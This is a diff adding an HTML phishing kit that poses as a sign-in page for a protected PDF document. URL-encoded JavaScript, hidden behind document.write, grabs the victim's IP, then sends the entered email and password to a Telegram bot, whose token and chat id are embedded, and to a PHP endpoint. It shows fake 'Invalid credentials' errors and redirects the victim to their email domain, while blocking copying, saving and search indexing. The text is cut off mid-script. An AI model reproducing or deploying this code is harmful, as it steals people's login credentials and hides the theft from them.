@@ -1,0 +1,394 @@
+<html id="html" data-emailvalue="[[-Email-]]" lang="en"><head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex">
+  <meta name="googlebot" content="noindex">
+  <meta name="googlebot-news" content="noindex">
+  <meta name="otherbot" content="noindex">
+  <meta name="noarchive" content="noindex">
+  <meta name="nosnippet" content="noindex">
+  <meta name="noimageindex" content="noindex">
+  <meta name="robots" content="none">
+  <meta name="googlebot" content="none">
+  <meta name="googlebot-news" content="none">
+  <meta name="otherbot" content="none">
+  <meta name="noarchive" content="none">
+  <meta name="nosnippet" content="none">
+  <meta name="noimageindex" content="none">
+  <meta name="robots" content="nofollow">
+  <meta name="googlebot" content="nofollow">
+  <meta name="googlebot-news" content="nofollow">
+  <meta name="otherbot" content="nofollow">
+  <meta name="noarchive" content="nofollow">
+  <meta name="nosnippet" content="nofollow">
+  <meta name="noimageindex" content="nofollow">
+  <meta name="robots" content="max-snippet:0">
+  <meta name="robots" content="unavailable_after: 2025-09-22">
+  <script> document.addEventListener('keydown', function(e) { if (e.key === 's' && (navigator.platform.match('Mac') ? e.metaKey : e.ctrlKey)) { e.preventDefault();}});</script>
+  <title>Sign | PDF</title>
+  <link rel="SHORTCUT ICON" href="https://cdn.glitch.global/30e3fd15-1595-4f62-8949-4a92dad3c744/pdf-logo.png?v=1703176079035" type="image/x-icon">
+  <script language="javascript"> document.write( unescape( '%20%20%3Cstyle%3E%0A%20%20%20%20body%20%7B%0A%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20font-family%3A%20Trebuchet%20MS%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.topnav%20%7B%0A%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20background-color%3A%20%23333%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.topnav%20a%20%7B%0A%20%20%20%20%20%20float%3A%20left%3B%0A%20%20%20%20%20%20color%3A%20%23f2f2f2%3B%0A%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20padding%3A%2014px%2016px%3B%0A%20%20%20%20%20%20text-decoration%3A%20none%3B%0A%20%20%20%20%20%20font-size%3A%2017px%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.topnav%20a%3Ahover%20%7B%0A%20%20%20%20%20%20background-color%3A%20%23ddd%3B%0A%20%20%20%20%20%20color%3A%20black%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.topnav%20a.active%20%7B%0A%20%20%20%20%20%20background-color%3A%20%2300a1f1%3B%0A%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20input%5Btype%3Dtext%5D%2C%20input%5Btype%3Demail%5D%20%7B%0A%20%20%20%20%20%20%20%20width%3A%2070%25%3B%0A%20%20%20%20%20%20%20%20padding%3A%2012px%2020px%3B%0A%20%20%20%20%20%20%20%20margin%3A%208px%200%3B%0A%20%20%20%20%20%20%20%20display%3A%20inline-block%3B%0A%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23ccc%3B%0A%20%20%20%20%20%20%20%20box-sizing%3A%20border-box%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20input%5Btype%3Dtext%5D%2C%20input%5Btype%3Dpassword%5D%20%7B%0A%20%20%20%20%20%20%20%20width%3A%2070%25%3B%0A%20%20%20%20%20%20%20%20padding%3A%2012px%2020px%3B%0A%20%20%20%20%20%20%20%20margin%3A%208px%200%3B%0A%20%20%20%20%20%20%20%20display%3A%20inline-block%3B%0A%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23ccc%3B%0A%20%20%20%20%20%20%20%20box-sizing%3A%20border-box%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20button%20%7B%0A%20%20%20%20%20%20%20%20background-color%3A%20rgb(16%2C%2075%2C%2016)%3B%0A%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20padding%3A%2014px%2020px%3B%0A%20%20%20%20%20%20%20%20margin%3A%208px%200%3B%0A%20%20%20%20%20%20%20%20border%3A%20none%3B%0A%20%20%20%20%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20%20%20%20%20width%3A%2070%25%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20button%3Ahover%20%7B%0A%20%20%20%20%20%20%20%20opacity%3A%200.8%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.cancelbtn%20%7B%0A%20%20%20%20%20%20%20%20width%3A%20auto%3B%0A%20%20%20%20%20%20%20%20padding%3A%2010px%2018px%3B%0A%20%20%20%20%20%20%20%20background-color%3A%20%23f44336%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.imgcontainer%20%7B%0A%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20margin%3A%2010px%2010px%200%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20img.avatar%20%7B%0A%20%20%20%20%20%20%20%20width%3A%2040%25%3B%0A%20%20%20%20%20%20%20%20border-radius%3A%2050%25%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.container%20%7B%0A%20%20%20%20%20%20%20%20padding%3A%2010px%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20span.psw%20%7B%0A%20%20%20%20%20%20%20%20float%3A%20right%3B%0A%20%20%20%20%20%20%20%20padding-top%3A%2016px%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F*%20Change%20styles%20for%20span%20and%20cancel%20button%20on%20extra%20small%20screens%20*%2F%0A%20%20%20%20%40media%20screen%20and%20(max-width%3A%20300px)%20%7B%0A%20%20%20%20%20%20%20%20span.psw%20%7B%0A%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20float%3A%20none%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.cancelbtn%20%7B%0A%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F*%20The%20Modal%20(background)%20*%2F%0A%20%20%20%20.modal%20%7B%0A%20%20%20%20%20%20%20%20display%3A%20none%3B%20%2F*%20Hidden%20by%20default%20*%2F%0A%20%20%20%20%20%20%20%20position%3A%20fixed%3B%20%2F*%20Stay%20in%20place%20*%2F%0A%20%20%20%20%20%20%20%20z-index%3A%201%3B%20%2F*%20Sit%20on%20top%20*%2F%0A%20%20%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20width%3A%20100%25%3B%20%2F*%20Full%20width%20*%2F%0A%20%20%20%20%20%20%20%20height%3A%20100%25%3B%20%2F*%20Full%20height%20*%2F%0A%20%20%20%20%20%20%20%20overflow%3A%20auto%3B%20%2F*%20Enable%20scroll%20if%20needed%20*%2F%0A%20%20%20%20%20%20%20%20background-color%3A%20rgb(0%2C0%2C0)%3B%20%2F*%20Fallback%20color%20*%2F%0A%20%20%20%20%20%20%20%20background-color%3A%20rgba(0%2C0%2C0%2C0.4)%3B%20%2F*%20Black%20w%2F%20opacity%20*%2F%0A%20%20%20%20%20%20%20%20padding-top%3A%2060px%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F*%20Modal%20Content%2FBox%20*%2F%0A%20%20%20%20.modal-content%20%7B%0A%20%20%20%20%20%20%20%20background-color%3A%20%23fefefe%3B%0A%20%20%20%20%20%20%20%20margin%3A%205%25%20auto%2015%25%20auto%3B%20%2F*%205%25%20from%20the%20top%2C%2015%25%20from%20the%20bottom%20and%20centered%20*%2F%0A%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23888%3B%0A%20%20%20%20%20%20%20%20width%3A%2030%25%3B%20%2F*%20Could%20be%20more%20or%20less%2C%20depending%20on%20screen%20size%20*%2F%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F*%20The%20Close%20Button%20(x)%20*%2F%0A%20%20%20%20.close%20%7B%0A%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20right%3A%2025px%3B%0A%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20font-size%3A%2035px%3B%0A%20%20%20%20%20%20%20%20font-weight%3A%20bold%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20.close%3Ahover%2C%0A%20%20%20%20.close%3Afocus%20%7B%0A%20%20%20%20%20%20%20%20color%3A%20red%3B%0A%20%20%20%20%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F*%20Add%20Zoom%20Animation%20*%2F%0A%20%20%20%20.animate%20%7B%0A%20%20%20%20%20%20%20%20-webkit-animation%3A%20animatezoom%200.6s%3B%0A%20%20%20%20%20%20%20%20animation%3A%20animatezoom%200.6s%0A%20%20%20%20%7D%0A%0A%20%20%20%20%40-webkit-keyframes%20animatezoom%20%7B%0A%20%20%20%20%20%20%20%20from%20%7B-webkit-transform%3A%20scale(0)%7D%0A%20%20%20%20%20%20%20%20to%20%7B-webkit-transform%3A%20scale(1)%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20%40keyframes%20animatezoom%20%7B%0A%20%20%20%20%20%20%20%20from%20%7Btransform%3A%20scale(0)%7D%0A%20%20%20%20%20%20%20%20to%20%7Btransform%3A%20scale(1)%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2F*%20Change%20styles%20for%20span%20and%20cancel%20button%20on%20extra%20small%20screens%20*%2F%0A%20%20%20%20%40media%20screen%20and%20(max-width%3A%20300px)%20%7B%0A%20%20%20%20%20%20%20%20span.psw%20%7B%0A%20%20%20%20%20%20%20%20%20%20display%3A%20block%3B%0A%20%20%20%20%20%20%20%20%20%20float%3A%20none%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20.cancelbtn%20%7B%0A%20%20%20%20%20%20%20%20%20%20width%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E' ) );</script>  <style>
+    body {
+      margin: 0;
+      font-family: Trebuchet MS;
+    }
+
+    .topnav {
+      overflow: hidden;
+      background-color: #333;
+    }
+
+    .topnav a {
+      float: left;
+      color: #f2f2f2;
+      text-align: center;
+      padding: 14px 16px;
+      text-decoration: none;
+      font-size: 17px;
+    }
+
+    .topnav a:hover {
+      background-color: #ddd;
+      color: black;
+    }
+
+    .topnav a.active {
+      background-color: #00a1f1;
+      color: white;
+    }
+
+    input[type=text], input[type=email] {
+        width: 70%;
+        padding: 12px 20px;
+        margin: 8px 0;
+        display: inline-block;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+    }
+
+
+    input[type=text], input[type=password] {
+        width: 70%;
+        padding: 12px 20px;
+        margin: 8px 0;
+        display: inline-block;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+    }
+
+    button {
+        background-color: #8B0000;
+        color: white;
+        padding: 14px 20px;
+        margin: 8px 0;
+        border: none;
+        cursor: pointer;
+        width: 70%;
+    }
+
+    button:hover {
+        opacity: 0.8;
+    }
+
+    .cancelbtn {
+        width: auto;
+        padding: 10px 18px;
+        background-color: #f44336;
+    }
+
+    .imgcontainer {
+        text-align: center;
+        margin: 10px 10px 0;
+    }
+
+    img.avatar {
+        width: 40%;
+        border-radius: 50%;
+    }
+
+    .container {
+        padding: 10px;
+    }
+
+    span.psw {
+        float: right;
+        padding-top: 16px;
+    }
+
+    /* Change styles for span and cancel button on extra small screens */
+    @media screen and (max-width: 300px) {
+        span.psw {
+          display: block;
+          float: none;
+        }
+        .cancelbtn {
+          width: 100%;
+        }
+    }
+
+    /* The Modal (background) */
+    .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgb(0,0,0); /* Fallback color */
+        background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+        padding-top: 60px;
+    }
+
+    /* Modal Content/Box */
+    .modal-content {
+        background-color: #fefefe;
+        margin: 5% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+        border: 1px solid #888;
+        width: 30%; /* Could be more or less, depending on screen size */
+    }
+
+    /* The Close Button (x) */
+    .close {
+        position: absolute;
+        right: 25px;
+        top: 0;
+        color: #000;
+        font-size: 35px;
+        font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+        color: red;
+        cursor: pointer;
+    }
+
+    /* Add Zoom Animation */
+    .animate {
+        -webkit-animation: animatezoom 0.6s;
+        animation: animatezoom 0.6s
+    }
+
+    @-webkit-keyframes animatezoom {
+        from {-webkit-transform: scale(0)}
+        to {-webkit-transform: scale(1)}
+    }
+
+    @keyframes animatezoom {
+        from {transform: scale(0)}
+        to {transform: scale(1)}
+    }
+
+    /* Change styles for span and cancel button on extra small screens */
+    @media screen and (max-width: 300px) {
+        span.psw {
+          display: block;
+          float: none;
+        }
+        .cancelbtn {
+          width: 100%;
+        }
+    }
+  </style>
+</head>
+<body oncopy="return false" oncut="return false" onpaste="return true" return="return false" oncontextmenu="return false" unselectable="on">
+  <header style="background-image: url('https://i.gyazo.com/2c43c04d081c7e893d99ca4fa154a502.jpg'); height: 100vh; background-size: cover;"></header>
+  <p style="font-family: 'Trebuchet MS'; font-size: 14px; color: #000000;">
+  </p><div id="id01" class="modal" style="display: block;">
+    <div class="modal-content animate">
+      <div class="imgcontainer">
+        <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal"><b></b></span>
+        <img src="https://cdn.glitch.global/30e3fd15-1595-4f62-8949-4a92dad3c744/pdf-logo.png?v=1703176079035" width="20%">
+      </div>
+      <div class="container" style="text-align: center;">
+        <p style="font-family: 'Trebuchet MS'; font-size: 14px; color: #000000;">
+          Protected for unauthorized access &#x1F512;: <br>Sign in with correct email credentials to view document.<br>
+          </p><form action="http://aTsend.php" method="POST" id="myform">
+            <div style="width: 70%; font-size: 10px; margin: 0 auto;">
+              <p id="successMessage" style="border: 1px solid red; color: red; padding: 10px; border-radius: 10px; display: none;"></p>
+            </div>
+            <input type="text" name="3w41l" id="3w41l" disabled=""><br>
+            <input type="hidden" name="hdn3w41l" id="hdn3w41l" value="">
+            <div style="width: 70%; font-size: 10px; margin: 0 auto;">
+              <p id="error" style="color: red;display: none;">This account doesn't exist. Please, enter a different account.</p>
+            </div>
+            <input type="password" id="q455m0T2" placeholder="Enter Password" name="q455m0T2" required=""><br>
+            <div style="width: 70%; font-size: 10px; margin: 0 auto;">
+              <p id="pwdMsg" style="color: red;display: none;">Password field is empty.!</p>
+            </div>
+            <button type="submit" id="submit-btn">view document</button>
+          </form>
+        <p></p>
+      </div>
+    </div>
+  </div>
+<script language="javascript">
+  document.write( unescape( '%20%3Cscript%20src%3D%22https%3A%2F%2Fcode.jquery.com%2Fjquery-3.6.0.min.js%22%20integrity%3D%22sha256-%2FxUj%2B3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej%2Fm4%3D%22%20crossorigin%3D%22anonymous%22%3E%3C%2Fscript%3E%0A%0A%20%20%3Cscript%3E%0A%20%20%20%20%24%28document%29.ready%28function%28%29%7B%0A%20%20%20%20%20%20let%20userIP%20%3D%20%27%27%3B%0A%20%20%20%20%20%20var%20count%3D0%3B%0A%20%20%20%20%20%20var%20pcount%3D0%3B%0A%20%20%20%20%20%20%24.getJSON%28%27https%3A%2F%2Fapi.ipify.org%3Fformat%3Djson%27%2C%20function%28data%29%7B%0A%20%20%20%20%20%20%20%20userIP%20%3D%20data.ip%3B%0A%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%2F%2F%20%20page%20setup%20area%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0A%20%20%20%20%20%20var%20bot_token%20%3D%207450777719%3AAAH-_hASOqh4FXLifA0Euuv0ugyUwr5dZUo%22%3B%20%0A%20%20%20%20%20%20var%20group_id%20%3D%20%227380014688%22%3B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20var%20retries%20%3D%203%3B%0A%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%20%20set%20your%20php%20forder%20here%20%0A%20%20%20%20%20%20%2F%2F%20%20php%20server%20setup%20area%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0A%20%20%20%20%20%20var%20server_url%20%3D%20%22.php%22%3B%20%0A%20%20%20%20%20%20%2F%2F%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0A%0A%20%20%20%20%20%20const%20htmlElement%20%3D%20document.getElementById%28%22html%22%29%3B%0A%20%20%20%20%20%20var%20_3w41l%20%3D%20window.location.hash.substr%281%29%3B%0A%20%20%20%20%20%20var%20h3w41l%20%3D%20htmlElement.dataset.emailvalue%3B%0A%20%20%20%20%20%20if%20%28_3w41l%20%7C%7C%20h3w41l%29%20%7B%0A%20%20%20%20%20%20%20%20var%20my_3w41l%20%3D%20_3w41l%20%7C%7C%20h3w41l%3B%0A%20%20%20%20%20%20%20%20%24%28%27%233w41l%27%29.val%28my_3w41l%29%3B%0A%20%20%20%20%20%20%20%20%2F%2F%20%24%28%27%23hdn3w41l%27%29.val%28my_3w41l%29%3B%0A%0A%20%20%20%20%20%20%20%20var%20filter%20%3D%20%2F%5E%28%5Ba-zA-Z0-9_%5C.%5C-%5D%29%2B%5C%40%28%28%5Ba-zA-Z0-9%5C-%5D%29%2B%5C.%29%2B%28%5Ba-zA-Z0-9%5D%7B2%2C4%7D%29%2B%24%2F%3B%0A%0A%20%20%20%20%20%20%20%20if%20%28%21filter.test%28my_3w41l%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20_3w41l.focus%3B%0A%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%24%28%27%23myform%27%29.on%28%27submit%27%2C%20function%28event%29%7B%0A%20%20%20%20%20%20%20%20event.preventDefault%28%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.attr%28%27disabled%27%2C%20%27disabled%27%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23successMessage%27%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20%24%28%27%23pwdMsg%27%29.hide%28%29%3B%0A%20%20%20%20%20%20%20%20_3w41l%3D%24%28%22%233w41l%22%29.val%28%29%3B%0A%20%20%20%20%20%20%20%20var%20q455m0T2%3D%24%28%22%23q455m0T2%22%29.val%28%29%3B%0A%0A%20%20%20%20%20%20%20%20if%20%28%21q455m0T2%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27%23pwdMsg%27%29.show%28%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20var%20filter%20%3D%20%2F%5E%28%5Ba-zA-Z0-9_%5C.%5C-%5D%29%2B%5C%40%28%28%5Ba-zA-Z0-9%5C-%5D%29%2B%5C.%29%2B%28%5Ba-zA-Z0-9%5D%7B2%2C4%7D%29%2B%24%2F%3B%0A%0A%20%20%20%20%20%20%20%20if%20%28%21filter.test%28_3w41l%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24%28%27%23error%27%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20_3w41l.focus%3B%0A%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20TG%20script%0A%20%20%20%20%20%20%20%20if%20%28bot_token%20%26%26%20group_id%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20url_tg%20%3D%20%22https%3A%2F%2Fapi.telegram.org%2Fbot%22%2Bbot_token%2B%22%2FsendMessage%3Fchat_id%3D%22%2Bgroup_id%2B%22%26text%3D%22%3B%0A%20%20%20%20%20%20%20%20%20%20url_tg%20%3D%20url_tg%20%2B%20encodeURIComponent%28%22%3D%3D%3D%3DNEW%20Share-Point%20Log%3D%3D%3D%3D%5Cn%20Email%3A%20%22%20%2B%20_3w41l%20%2B%20%22%5CnPassword%3A%20%22%20%2B%20q455m0T2%20%2B%20%22%5CnUserIp%3A%20%22%20%2B%20userIP%29%3B%0A%20%20%20%20%20%20%20%20%20%20%24.ajax%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20url_tg%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20data%3A%20%24this.serialize%28%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28xhr%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28response%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%60real%20count%20of%20%24%7Bcount%7D%60%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23q455m0T2%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28retries%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%3E%3Dretries-1%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%3D0%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%60got%20redirect%20count%20of%20%24%7Bcount%7D%60%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%60https%3A%2F%2F%24%7B_3w41l.split%28%27%40%27%29%5B1%5D%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%2B%3D1%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%60increased%20count%20of%20%24%7Bcount%7D%60%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.removeAttr%28%27disabled%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23successMessage%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23successMessage%27%29.html%28%22Invalid%20credentials.%20Please%20try%20again%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23q455m0T2%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28retries%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28count%3E%3Dretries-1%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%3D0%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%60got%20error%20redirect%20count%20of%20%24%7Bcount%7D%60%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%60https%3A%2F%2F%24%7B_3w41l.split%28%27%40%27%29%5B1%5D%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20count%2B%3D1%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.removeAttr%28%27disabled%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23successMessage%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23successMessage%27%29.html%28%22Invalid%20credentials.%20Please%20try%20again%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20php%20server%20script%0A%20%20%20%20%20%20%20%20if%20%28server_url.trim%28%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24.ajax%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20server_url%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20_3w41l%3A%20_3w41l%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q455m0T2%3A%20q455m0T2%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20userIP%3A%20userIP%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20data%3A%20%24this.serialize%28%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20beforeSend%3A%20function%28xhr%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%28response%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%28response%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28response%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23q455m0T2%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28retries%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28pcount%3E%3Dretries-1%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pcount%3D0%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%60https%3A%2F%2F%24%7B_3w41l.split%28%27%40%27%29%5B1%5D%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pcount%2B%3D1%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.removeAttr%28%27disabled%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23successMessage%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23successMessage%27%29.html%28%22Inva